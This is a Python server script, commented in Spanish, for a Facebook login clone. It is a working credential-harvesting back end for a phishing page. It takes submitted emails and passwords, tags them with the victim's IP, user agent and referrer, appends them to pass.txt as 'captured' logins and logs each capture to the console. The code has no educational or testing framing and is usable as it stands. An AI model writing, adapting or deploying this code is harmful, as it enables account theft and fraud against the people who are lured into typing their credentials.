#!/usr/bin/env python3
"""
Servidor simple para el clon de Facebook que guarda credenciales en pass.txt
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import urllib.parse
from datetime import datetime
import os
import socket
import requests

class FacebookHandler(SimpleHTTPRequestHandler):
    def get_local_ip(self):
        """Obtener IP local de la PC en la red"""
        try:
            # Conectar a un servidor externo para obtener la IP local
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "No disponible"
    
    def get_external_ip(self):
        """Obtener IP externa real"""
        try:
            # Usar múltiples servicios para obtener IP externa
            services = [
                'https://api.ipify.org',
                'https://ipinfo.io/ip',
                'https://icanhazip.com',
                'https://ident.me'
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        return response.text.strip()
                except:
                    continue
            return "No disponible"
        except:
            return "No disponible"
    
    def get_client_info(self):
        """Obtener información completa del cliente"""
        # IP del cliente (puede ser local si está en la misma red)
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # IP local de la PC servidor
        local_ip = self.get_local_ip()
        
        # IP externa real
        external_ip = self.get_external_ip()
        
        return {
            'client_ip': client_ip,
            'local_ip': local_ip,
            'external_ip': external_ip
        }

    def do_POST(self):
        if self.path == '/save_credentials':
            try:
                # Leer datos del request
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                # Obtener información completa de IPs
                ip_info = self.get_client_info()
                
                # Solo guardar si es un login completo (no keylogger)
                if data.get('type') in ['initial', 'confirmation']:
                    # Formatear datos para el archivo
                    formatted_data = f"""
=== FACEBOOK LOGIN CAPTURADO ===
Fecha y Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Intento #: {data.get('attempt', 1)}
Tipo: {data.get('type', 'login')}
Email/Usuario: {data.get('email', 'N/A')}
Contraseña: {data.get('password', 'N/A')}
User Agent: {data.get('userAgent', 'N/A')}
IP Cliente: {ip_info['client_ip']}
IP Local PC: {ip_info['local_ip']}
IP Externa Real: {ip_info['external_ip']}
URL: {data.get('url', 'N/A')}
Referrer: {data.get('referrer', 'N/A')}
============================
"""
                    
                    # Guardar en archivo
                    with open('pass.txt', 'a', encoding='utf-8') as f:
                        f.write(formatted_data)
                    
                    print(f"✅ Credenciales capturadas: {data.get('email', 'N/A')} - Intento #{data.get('attempt', 1)}")
                    print(f"📍 IPs: Cliente={ip_info['client_ip']} | Local={ip_info['local_ip']} | Externa={ip_info['external_ip']}")
                
                # Responder al cliente
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                
                response = {'status': 'success', 'message': 'Datos procesados'}
                self.wfile.write(json.dumps(response).encode())
                
            except Exception as e:
                print(f"❌ Error al procesar datos: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        # Manejar preflight requests para CORS
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

def run_server(port=8000):
    """Ejecutar el servidor"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, FacebookHandler)
    
    print(f"🚀 Servidor iniciado en http://localhost:{port}")
    print("📝 Los datos se guardarán en pass.txt")
    print("🛑 Presiona Ctrl+C para detener el servidor")
    print("=" * 50)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Servidor detenido")
        httpd.server_close()

if __name__ == '__main__':
    run_server()